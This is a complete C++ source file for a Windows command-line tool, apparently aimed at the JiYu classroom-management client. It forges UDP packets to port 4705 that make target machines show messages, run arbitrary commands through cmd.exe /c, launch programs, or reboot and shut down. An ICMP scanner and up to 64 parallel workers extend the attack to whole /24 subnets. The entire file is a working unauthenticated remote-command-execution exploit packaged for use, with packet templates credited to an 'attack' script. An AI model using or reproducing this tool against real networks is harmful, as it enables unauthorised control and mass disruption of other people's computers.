
#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>
#include <icmpapi.h>
#include <fcntl.h>
#include <io.h>

#include <algorithm>
#include <array>
#include <atomic>
#include <chrono>
#include <cstdint>
#include <cwctype>
#include <exception>
#include <iostream>
#include <limits>
#include <memory>
#include <mutex>
#include <sstream>
#include <stdexcept>
#include <string>
#include <thread>
#include <utility>
#include <vector>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Iphlpapi.lib")

namespace {
using Packet = std::vector<std::uint8_t>;

struct Options {
    std::wstring ip, message, command, run, extra;
    unsigned short port = 4705;
    unsigned int count = 1, interval = 22;
    unsigned int workers = 64;
};

class SocketRuntime {
public:
    SocketRuntime() {
        WSADATA data{};
        if (WSAStartup(MAKEWORD(2, 2), &data) != 0)
            throw std::runtime_error("WSAStartup failed");
    }
    ~SocketRuntime() { WSACleanup(); }
    SocketRuntime(const SocketRuntime&) = delete;
    SocketRuntime& operator=(const SocketRuntime&) = delete;
};

class Socket {
public:
    Socket() : value_(socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) {
        if (value_ == INVALID_SOCKET) throw std::runtime_error("Cannot create UDP socket");
    }
    ~Socket() { closesocket(value_); }
    SOCKET get() const { return value_; }
    Socket(const Socket&) = delete;
    Socket& operator=(const Socket&) = delete;
private:
    SOCKET value_;
};

void Help() {
    std::wcout <<
        L"JiYuUdpTool - UDP command-line tool\n"
        L"Usage: JiYuUdpTool.exe (interactive mode)\n"
        L"       JiYuUdpTool.exe -ip IP [-p PORT] [-msg TEXT] [-c COMMAND] [-run PROGRAM]\n"
        L"       [-l COUNT] [-t SECONDS] [-j WORKERS] [-e r|s]\n\n"
        L"  -ip  IPv4 address, last-octet range (192.168.1.10-20), or /24\n"
        L"       /24 also accepts a three-octet prefix (192.168.1./24)\n"
        L"  -p   UDP port (default: 4705)\n"
        L"  -msg Send a message\n"
        L"  -c   Send a command for target cmd.exe /c\n"
        L"  -run Launch a program directly, without cmd.exe /c\n"
        L"  -l   Number of sends (default: 1)\n"
        L"  -t   Seconds between sends (default: 22)\n"
        L"  -j   Concurrent target workers, 1-64 (default: 64)\n"
        L"  -e   r=reboot, s=shutdown\n\n"
        L"Examples:\n"
        L"  -ip 192.168.80.12 -c \"taskkill /F /IM notepad.exe\"\n"
        L"  -ip 192.168.80.12 -run \"C:\\Windows\\System32\\notepad.exe\"\n"
        L"  -ip 192.168.80.12 -c \"rundll32.exe user32.dll,LockWorkStation\"\n";
}

unsigned int Number(const std::wstring& input, unsigned int min, unsigned int max) {
    if (input.empty() || input.find_first_not_of(L"0123456789") != std::wstring::npos)
        throw std::runtime_error("Invalid number");
    const unsigned long value = std::stoul(input);
    if (value < min || value > max) throw std::runtime_error("Number outside valid range");
    return static_cast<unsigned int>(value);
}

Options Parse(int argc, wchar_t* argv[]) {
    Options o;
    for (int i = 1; i < argc; ++i) {
        const std::wstring key = argv[i];
        if (key == L"-h" || key == L"--help") {
            Help();
            ExitProcess(0);
        }
        if (i + 1 >= argc) throw std::runtime_error("Missing option value");
        const std::wstring value = argv[++i];
        if (key == L"-ip") o.ip = value;
        else if (key == L"-p") o.port = static_cast<unsigned short>(Number(value, 1, 65535));
        else if (key == L"-msg") o.message = value;
        else if (key == L"-c") o.command = value;
        else if (key == L"-run") o.run = value;
        else if (key == L"-l") o.count = Number(value, 1, 100000);
        else if (key == L"-t") o.interval = Number(value, 0, 86400);
        else if (key == L"-j") o.workers = Number(value, 1, 64);
        else if (key == L"-e") o.extra = value;
        else throw std::runtime_error("Unknown option");
    }
    if (!o.extra.empty() && o.extra != L"r" && o.extra != L"s")
        throw std::runtime_error("Unknown -e mode");
    if (o.ip.empty()) throw std::runtime_error("-ip is required");
    if (o.message.empty() && o.command.empty() && o.run.empty() && o.extra.empty())
        throw std::runtime_error("Specify -msg, -c, -run, or -e");
    return o;
}

Packet HexPacket(std::size_t length, const char* hex) {
    Packet packet(length, 0);
    std::size_t offset = 0;
    auto digit = [](char c) -> unsigned char {
        if (c >= '0' && c <= '9') return static_cast<unsigned char>(c - '0');
        if (c >= 'a' && c <= 'f') return static_cast<unsigned char>(c - 'a' + 10);
        throw std::runtime_error("Invalid packet template");
    };
    while (*hex) {
        if (!hex[1] || offset == length) throw std::runtime_error("Invalid packet template length");
        packet[offset++] = static_cast<std::uint8_t>((digit(hex[0]) << 4) | digit(hex[1]));
        hex += 2;
    }
    return packet;
}

Packet Template(unsigned int type) {
    // The template bytes are copied from py/Jiyu_udp_attack.py.
    if (type == 0) return HexPacket(954,
        "444d4f43000001009e0300001041affba0e7524091dc27a3b6f9292e204e0000"
        "c0a85081910300009103000000080000000000000500000000000000");
    if (type == 1) {
        Packet p = HexPacket(906,
            "444d4f43000001006e0300005b682b256f61644da792f04700c5a40e204e0000"
            "c0a86486610300006103000000020000000000000f00000001000000");
        const Packet path = HexPacket(54,
            "43003a005c00570069006e0064006f00770073005c0073007900730074006500"
            "6d00330032005c0063006d0064002e00650078006500");
        std::copy(path.begin(), path.end(), p.begin() + 60);
        p[572] = '/'; p[574] = 'c'; p[576] = ' ';
        p[892] = 1; p[896] = 1;
        return p;
    }
    Packet p = HexPacket(582, type == 2 ?
        "444d4f43000001002a020000bf40224e572d3e4f9b6fc18de1eb4f62204e0000"
        "c0a850811d0200001d0200000002000000000000130000100f000000" :
        "444d4f43000001002a020000c8e397fdc0b59f45877205bd4e46a896204e0000"
        "c0a850811d0200001d0200000002000000000000140000100f000000");
    const Packet suffix = HexPacket(30, type == 2 ?
        "01000000000000005965085e065ccd912f54a8608476a18b977b3a670230" :
        "01000000000000005965085e065c7351ed95a8608476a18b977b3a670230");
    std::copy(suffix.begin(), suffix.end(), p.begin() + 60);
    return p;
}

Packet WithText(unsigned int type, const std::wstring& text) {
    const std::size_t start = type == 0 ? 56 : 578;
    const std::size_t limit = type == 0 ? 954 : 892;
    if (text.size() * sizeof(wchar_t) + 2 > limit - start)
        throw std::runtime_error(type == 0 ? "Message is too long" : "Command is too long");
    Packet packet = Template(type);
    for (std::size_t i = 0; i < text.size(); ++i) {
        packet[start + i * 2] = static_cast<std::uint8_t>(text[i] & 0xff);
        packet[start + i * 2 + 1] = static_cast<std::uint8_t>(text[i] >> 8);
    }
    return packet;
}

Packet WithProgram(const std::wstring& input) {
    const auto start = input.find_first_not_of(L" \t");
    if (start == std::wstring::npos) throw std::runtime_error("Program path is required");
    std::wstring program;
    std::wstring arguments;
    std::size_t after = std::wstring::npos;
    if (input[start] == L'"') {
        const auto closing = input.find(L'"', start + 1);
        if (closing == std::wstring::npos) throw std::runtime_error("Unclosed program path quote");
        program = input.substr(start + 1, closing - start - 1);
        after = closing + 1;
        if (after < input.size() && input[after] != L' ' && input[after] != L'\t')
            throw std::runtime_error("Separate program path and arguments with a space");
    } else {
        after = input.find_first_of(L" \t", start);
        program = input.substr(start, after - start);
    }
    if (program.empty() || program.find(L'"') != std::wstring::npos)
        throw std::runtime_error("Invalid program path");
    if (after != std::wstring::npos) {
        const auto argsStart = input.find_first_not_of(L" \t", after);
        if (argsStart != std::wstring::npos) arguments = input.substr(argsStart);
    }
    const auto argsEnd = arguments.find_last_not_of(L" \t");
    if (argsEnd != std::wstring::npos) arguments.erase(argsEnd + 1);
    if (program.size() > 255) throw std::runtime_error("Program path is too long");
    if (arguments.size() > 159) throw std::runtime_error("Program arguments are too long");

    Packet packet = Template(1);
    std::fill(packet.begin() + 60, packet.begin() + 892, 0);
    auto write = [&](std::size_t offset, const std::wstring& text) {
        for (wchar_t c : text) {
            packet[offset++] = static_cast<std::uint8_t>(c & 0xff);
            packet[offset++] = static_cast<std::uint8_t>(c >> 8);
        }
    };
    write(60, program);
    write(572, arguments);
    return packet;
}

in_addr IPv4(const std::wstring& value) {
    in_addr address{};
    if (InetPtonW(AF_INET, value.c_str(), &address) != 1)
        throw std::runtime_error("Invalid IPv4 address");
    return address;
}

std::vector<in_addr> Targets(const std::wstring& input) {
    const std::size_t slash = input.find(L'/');
    const std::size_t dash = input.find(L'-');
    if (slash != std::wstring::npos && dash != std::wstring::npos)
        throw std::runtime_error("Invalid IP range");
    if (slash == std::wstring::npos && dash == std::wstring::npos)
        return {IPv4(input)};
    const std::size_t split = slash != std::wstring::npos ? slash : dash;
    std::wstring base = input.substr(0, split);
    if (slash != std::wstring::npos && !base.empty() && base.back() == L'.')
        base += L'0';
    const in_addr first = IPv4(base);
    const unsigned int host = ntohl(first.S_un.S_addr);
    const unsigned int begin = slash != std::wstring::npos ? 1 : (host & 255);
    unsigned int end = 254;
    if (slash != std::wstring::npos) {
        if (input.substr(split) != L"/24") throw std::runtime_error("Only /24 is supported");
    } else {
        end = Number(input.substr(split + 1), 0, 255);
        if (end < begin) throw std::runtime_error("IP range ends before it starts");
    }
    std::vector<in_addr> result;
    for (unsigned int octet = begin; octet <= end; ++octet) {
        in_addr current{};
        current.S_un.S_addr = htonl((host & 0xffffff00u) | octet);
        result.push_back(current);
    }
    return result;
}

template <typename Worker>
void RunWorkers(std::size_t count, Worker worker) {
    std::vector<std::thread> threads;
    threads.reserve(count);
    try {
        for (std::size_t i = 0; i < count; ++i) threads.emplace_back(worker);
    } catch (...) {
        for (auto& thread : threads) thread.join();
        throw;
    }
    for (auto& thread : threads) thread.join();
}

void Send(const Options& options, const std::vector<Packet>& packets,
          const std::vector<in_addr>& targets, std::wostream& out) {
    if (packets.empty()) throw std::runtime_error("No packets to send");
    if (targets.empty()) throw std::runtime_error("No targets selected");
    for (unsigned int iteration = 0; iteration < options.count; ++iteration) {
        std::atomic<std::size_t> next{0};
        std::atomic<bool> failed{false};
        std::exception_ptr firstError;
        std::mutex errorMutex;
        auto worker = [&] {
            try {
                Socket socket;
                for (std::size_t i = next.fetch_add(1);
                     i < targets.size() && !failed.load(); i = next.fetch_add(1)) {
                    sockaddr_in destination{};
                    destination.sin_family = AF_INET;
                    destination.sin_addr = targets[i];
                    destination.sin_port = htons(options.port);
                    for (const Packet& packet : packets) {
                        const int sent = sendto(socket.get(), reinterpret_cast<const char*>(packet.data()),
                            static_cast<int>(packet.size()), 0,
                            reinterpret_cast<const sockaddr*>(&destination), sizeof(destination));
                        if (sent != static_cast<int>(packet.size()))
                            throw std::runtime_error("UDP send failed, WSA error " + std::to_string(WSAGetLastError()));
                    }
                }
            } catch (...) {
                std::lock_guard<std::mutex> lock(errorMutex);
                if (!firstError) firstError = std::current_exception();
                failed.store(true);
            }
        };
        RunWorkers((std::min)(targets.size(), static_cast<std::size_t>(options.workers)), worker);
        if (firstError) std::rethrow_exception(firstError);
        out << L"Sent " << (iteration + 1) << L"/" << options.count
            << L" to " << targets.size() << L" address(es)\n";
        if (iteration + 1 < options.count)
            std::this_thread::sleep_for(std::chrono::seconds(options.interval));
    }
}

std::vector<in_addr> Scan(const std::wstring& range, unsigned int workers, std::wostream& out) {
    const auto targets = Targets(range);
    std::vector<DWORD> latency(targets.size(), std::numeric_limits<DWORD>::max());
    std::atomic<std::size_t> next{0};
    std::atomic<DWORD> openError{0};
    const std::size_t workerCount = (std::min)(targets.size(), static_cast<std::size_t>(workers));
    out << L"Scanning " << targets.size() << L" address(es) with ICMP echo using "
        << workerCount << L" worker(s)...\n";
    auto worker = [&] {
        HANDLE icmp = IcmpCreateFile();
        if (icmp == INVALID_HANDLE_VALUE) {
            openError.store(GetLastError());
            return;
        }
        char request[] = "JiYuUdpTool";
        alignas(ICMP_ECHO_REPLY) std::array<std::uint8_t,
            sizeof(ICMP_ECHO_REPLY) + sizeof(request) + 8> reply{};
        for (std::size_t i = next.fetch_add(1); i < targets.size(); i = next.fetch_add(1)) {
            reply.fill(0);
            const DWORD count = IcmpSendEcho(icmp, targets[i].S_un.S_addr,
                request, static_cast<WORD>(sizeof(request)), nullptr,
                reply.data(), static_cast<DWORD>(reply.size()), 400);
            if (count != 0) {
                const auto* echo = reinterpret_cast<const ICMP_ECHO_REPLY*>(reply.data());
                if (echo->Status == IP_SUCCESS && echo->Address == targets[i].S_un.S_addr)
                    latency[i] = echo->RoundTripTime;
            }
        }
        IcmpCloseHandle(icmp);
    };
    RunWorkers(workerCount, worker);
    if (openError.load() != 0)
        throw std::runtime_error("Cannot open ICMP handle, Windows error " +
            std::to_string(openError.load()));
    std::vector<in_addr> responding;
    for (std::size_t i = 0; i < targets.size(); ++i) {
        if (latency[i] == std::numeric_limits<DWORD>::max()) continue;
        responding.push_back(targets[i]);
        wchar_t ip[INET_ADDRSTRLEN]{};
        if (InetNtopW(AF_INET, &targets[i], ip, INET_ADDRSTRLEN)) {
            out << L"  " << ip << L"  " << latency[i] << L" ms\n";
        }
    }
    out << L"Scan complete: " << targets.size() << L" checked, "
        << responding.size() << L" responded to ICMP echo.\n";
    return responding;
}

class TargetSelection {
public:
    struct Snapshot {
        std::wstring label, range;
        std::vector<in_addr> addresses;
        bool scanning = false;
    };

    void Set(const std::wstring& range, std::vector<in_addr> addresses) {
        std::lock_guard<std::mutex> lock(mutex_);
        ++version_;
        selected_ = {range, range, std::move(addresses), false};
    }

    unsigned int BeginScan(const std::wstring& range) {
        std::lock_guard<std::mutex> lock(mutex_);
        ++version_;
        selected_ = {L"scan " + range + L" (scanning)", range, {}, true};
        return version_;
    }

    bool FinishScan(unsigned int version, const std::wstring& range,
                    std::vector<in_addr> addresses, bool failed = false) {
        std::lock_guard<std::mutex> lock(mutex_);
        if (version != version_) return false;
        selected_ = {L"scan " + range + (failed ? L" (failed)" : L""),
                     range, std::move(addresses), false};
        return true;
    }

    Snapshot Get() const {
        std::lock_guard<std::mutex> lock(mutex_);
        return selected_;
    }

    void Restore(unsigned int version, Snapshot previous) {
        std::lock_guard<std::mutex> lock(mutex_);
        if (version != version_) return;
        ++version_;
        if (previous.scanning) {
            previous.label += L" (interrupted)";
            previous.scanning = false;
        }
        selected_ = std::move(previous);
    }
private:
    mutable std::mutex mutex_;
    Snapshot selected_;
    unsigned int version_ = 0;
};

class BackgroundJobs {
    struct Job {
        unsigned int id;
        std::wstring name;
        std::thread thread;
        std::atomic<bool> done{false};
        std::atomic<bool> failed{false};
    };
public:
    ~BackgroundJobs() { WaitAll(); }

    void EnsureCapacity() const {
        std::size_t running = 0;
        for (const auto& job : jobs_)
            if (!job->done.load()) ++running;
        if (running >= 4) throw std::runtime_error("Four jobs are already running; use wait");
    }

    template <typename Operation>
    void Start(const std::wstring& name, Operation operation) {
        EnsureCapacity();
        for (auto& job : jobs_) {
            if (job->done.load()) {
                if (job->thread.joinable()) job->thread.join();
            }
        }
        auto job = std::make_unique<Job>();
        job->id = nextId_++;
        job->name = name;
        Job* current = job.get();
        jobs_.push_back(std::move(job));
        {
            std::lock_guard<std::mutex> lock(outputMutex_);
            try {
                current->thread = std::thread([this, current, operation = std::move(operation)] {
                    std::wostringstream result;
                    try {
                        operation(result);
                    } catch (const std::exception& error) {
                        current->failed.store(true);
                        result << L"Error: " << error.what() << L"\n";
                    } catch (...) {
                        current->failed.store(true);
                        result << L"Error: unknown failure\n";
                    }
                    {
                        std::lock_guard<std::mutex> lock(outputMutex_);
                        std::wcout << L"\n[job " << current->id << L"] "
                                   << (current->failed.load() ? L"failed" : L"done")
                                   << L": " << current->name << L"\n" << result.str()
                                   << L"jiyu> " << std::flush;
                    }
                    current->done.store(true);
                });
            } catch (...) {
                jobs_.pop_back();
                throw;
            }
            std::wcout << L"[job " << current->id << L"] started: " << name << L"\n";
        }
    }

    void List() {
        std::lock_guard<std::mutex> lock(outputMutex_);
        if (jobs_.empty()) {
            std::wcout << L"No jobs.\n";
            return;
        }
        for (const auto& job : jobs_)
            std::wcout << L"[job " << job->id << L"] "
                       << (job->done.load() ? (job->failed.load() ? L"failed" : L"done") : L"running")
                       << L": " << job->name << L"\n";
    }

    void Wait(unsigned int id) {
        for (auto& job : jobs_) {
            if (job->id != id) continue;
            if (job->thread.joinable()) job->thread.join();
            return;
        }
        throw std::runtime_error("Unknown job ID");
    }

    void WaitAll() {
        for (auto& job : jobs_)
            if (job->thread.joinable()) job->thread.join();
    }
private:
    std::vector<std::unique_ptr<Job>> jobs_;
    unsigned int nextId_ = 1;
    std::mutex outputMutex_;
};

void InteractiveHelp() {
    std::wcout <<
        L"ip ADDRESS          Select IPv4, range, or prefix like 10.88.128./24\n"
        L"ip scan ADDRESS     Select only ICMP-responsive addresses from a range\n"
        L"scan [ADDRESS]      Ping a range, or the selected IP range\n"
        L"threads N           Set scan/send workers, 1-64 (default: 64)\n"
        L"jobs                Show background tasks\n"
        L"wait [ID]           Wait for all tasks or one task\n"
        L"port PORT           Select UDP port (default: 4705)\n"
        L"msg TEXT            Send a message to the selected target(s)\n"
        L"command CMD, c CMD  Send a command through target cmd.exe /c\n"
        L"run PROGRAM [ARGS]  Launch a program directly (quote paths with spaces)\n"
        L"reboot, r           Send reboot packet\n"
        L"shutdown, s         Send shutdown packet\n"
        L"status              Show selected target, port, and workers\n"
        L"help                Show commands\n"
        L"exit                Close the tool\n";
}

void Interactive() {
    Options selection;
    TargetSelection selected;
    BackgroundJobs jobs;
    std::wcout << L"JiYuUdpTool interactive mode. Use help for commands.\n";
    for (std::wstring line; ; ) {
        std::wcout << L"jiyu> " << std::flush;
        if (!std::getline(std::wcin, line)) {
            std::wcout << L"\n";
            return;
        }
        const auto first = line.find_first_not_of(L" \t");
        if (first == std::wstring::npos) continue;
        line.erase(0, first);
        const auto split = line.find_first_of(L" \t");
        std::wstring name = line.substr(0, split);
        std::transform(name.begin(), name.end(), name.begin(), towlower);
        if (!name.empty() && name.front() == L'/') name.erase(0, 1);
        std::wstring argument;
        if (split != std::wstring::npos) {
            const auto valueStart = line.find_first_not_of(L" \t", split);
            if (valueStart != std::wstring::npos) argument = line.substr(valueStart);
        }
        try {
            if (name == L"exit" || name == L"quit") {
                if (!argument.empty()) throw std::runtime_error("This command takes no argument");
                return;
            }
            if (name == L"help") {
                if (!argument.empty()) throw std::runtime_error("This command takes no argument");
                InteractiveHelp();
                continue;
            }
            if (name == L"scan") {
                const auto last = argument.find_last_not_of(L" \t");
                if (last != std::wstring::npos) argument.erase(last + 1);
                if (argument.find_first_of(L" \t") != std::wstring::npos)
                    throw std::runtime_error("Enter one IP range only");
                const std::wstring range = argument.empty() ? selected.Get().range : argument;
                if (range.empty()) throw std::runtime_error("Enter a range or select one with ip");
                Targets(range);
                jobs.Start(L"scan " + range, [range, workers = selection.workers](std::wostream& out) {
                    Scan(range, workers, out);
                });
                continue;
            }
            if (name == L"jobs") {
                if (!argument.empty()) throw std::runtime_error("This command takes no argument");
                jobs.List();
                continue;
            }
            if (name == L"wait") {
                if (argument.empty()) jobs.WaitAll();
                else jobs.Wait(Number(argument, 1, std::numeric_limits<unsigned int>::max()));
                continue;
            }
            if (name == L"ip" && (argument == L"scan" || argument.rfind(L"scan ", 0) == 0)) {
                std::wstring range = argument.substr(4);
                const auto firstValue = range.find_first_not_of(L" \t");
                if (firstValue == std::wstring::npos) throw std::runtime_error("Enter a range after ip scan");
                range.erase(0, firstValue);
                const auto lastValue = range.find_last_not_of(L" \t");
                range.erase(lastValue + 1);
                if (range.find_first_of(L" \t") != std::wstring::npos)
                    throw std::runtime_error("Enter one IP range only");
                Targets(range);
                jobs.EnsureCapacity();
                auto previous = selected.Get();
                const unsigned int version = selected.BeginScan(range);
                try {
                    jobs.Start(L"ip scan " + range,
                        [&selected, range, workers = selection.workers, version](std::wostream& out) {
                            try {
                                auto responding = Scan(range, workers, out);
                                const std::size_t count = responding.size();
                                if (selected.FinishScan(version, range, std::move(responding)))
                                    out << L"Selected " << count << L" responding address(es).\n";
                                else
                                    out << L"Scan result ignored: target changed after scan started.\n";
                            } catch (...) {
                                selected.FinishScan(version, range, {}, true);
                                throw;
                            }
                        });
                } catch (...) {
                    selected.Restore(version, std::move(previous));
                    throw;
                }
                continue;
            }
            if (name == L"ip" || name == L"port" || name == L"threads") {
                const auto last = argument.find_last_not_of(L" \t");
                if (last != std::wstring::npos) argument.erase(last + 1);
                if (argument.empty()) throw std::runtime_error("An argument is required");
                if (argument.find_first_of(L" \t") != std::wstring::npos)
                    throw std::runtime_error("Enter one value only");
                if (name == L"ip") {
                    auto targets = Targets(argument);
                    const std::size_t count = targets.size();
                    selected.Set(argument, std::move(targets));
                    std::wcout << L"Target: " << argument << L" (" << count
                               << L" address(es))\n";
                } else if (name == L"port") {
                    selection.port = static_cast<unsigned short>(Number(argument, 1, 65535));
                    std::wcout << L"Port: " << selection.port << L"\n";
                } else {
                    selection.workers = Number(argument, 1, 64);
                    std::wcout << L"Workers: " << selection.workers << L"\n";
                }
                continue;
            }
            if (name == L"status") {
                if (!argument.empty()) throw std::runtime_error("This command takes no argument");
                const auto target = selected.Get();
                std::wcout << L"Target: " << (target.label.empty() ? L"(not selected)" : target.label)
                           << L", port: " << selection.port
                           << L", workers: " << selection.workers
                           << L", targets: " << target.addresses.size() << L"\n";
                continue;
            }
            if (name != L"msg" && name != L"command" && name != L"c" && name != L"run" &&
                name != L"reboot" && name != L"r" && name != L"shutdown" && name != L"s")
                throw std::runtime_error("Unknown command; use help");
            const auto target = selected.Get();
            if (target.label.empty()) throw std::runtime_error("Select a target first with ip");
            if (target.scanning) throw std::runtime_error("Target scan is running; use wait first");
            if (target.addresses.empty()) throw std::runtime_error("No responding targets selected");
            if (name == L"msg" || name == L"command" || name == L"c" || name == L"run") {
                if (argument.empty()) {
                    std::wcout << (name == L"msg" ? L"Message: " : name == L"run" ? L"Program: " : L"Command: ") << std::flush;
                    if (!std::getline(std::wcin, argument)) return;
                }
                if (argument.empty()) throw std::runtime_error("Text is required");
                Packet packet = name == L"run" ? WithProgram(argument) :
                    WithText(name == L"msg" ? 0 : 1, argument);
                const std::wstring label = (name == L"msg" ? L"msg " : name == L"run" ? L"run " : L"command ") + target.label;
                jobs.Start(label, [options = selection, addresses = target.addresses,
                                   packet = std::move(packet)](std::wostream& out) {
                    Send(options, {packet}, addresses, out);
                });
            } else {
                if (!argument.empty()) throw std::runtime_error("This command takes no argument");
                const bool reboot = name == L"reboot" || name == L"r";
                Packet packet = Template(reboot ? 2 : 3);
                const std::wstring label = (reboot ? L"reboot " : L"shutdown ") + target.label;
                jobs.Start(label, [options = selection, addresses = target.addresses,
                                   packet = std::move(packet)](std::wostream& out) {
                    Send(options, {packet}, addresses, out);
                });
            }
        } catch (const std::exception& error) {
            std::wcerr << L"Error: " << error.what() << L"\n";
        }
    }
}

} // namespace

int wmain(int argc, wchar_t* argv[]) {
    SetConsoleOutputCP(CP_UTF8);
    _setmode(_fileno(stdout), _O_U8TEXT);
    _setmode(_fileno(stderr), _O_U8TEXT);
    DWORD consoleMode = 0;
    _setmode(_fileno(stdin), GetConsoleMode(GetStdHandle(STD_INPUT_HANDLE), &consoleMode)
        ? _O_U16TEXT : _O_U8TEXT);
    try {
        SocketRuntime network;
        if (argc == 1) {
            Interactive();
            return 0;
        }
        const Options options = Parse(argc, argv);
        std::vector<Packet> packets;
        if (!options.message.empty()) packets.push_back(WithText(0, options.message));
        if (!options.command.empty()) packets.push_back(WithText(1, options.command));
        if (!options.run.empty()) packets.push_back(WithProgram(options.run));
        if (options.extra == L"r") packets.push_back(Template(2));
        if (options.extra == L"s") packets.push_back(Template(3));
        Send(options, packets, Targets(options.ip), std::wcout);
        return 0;
    } catch (const std::exception& error) {
        std::wcerr << L"Error: " << error.what() << L"\nUse -h for help.\n";
        return 1;
    }
}
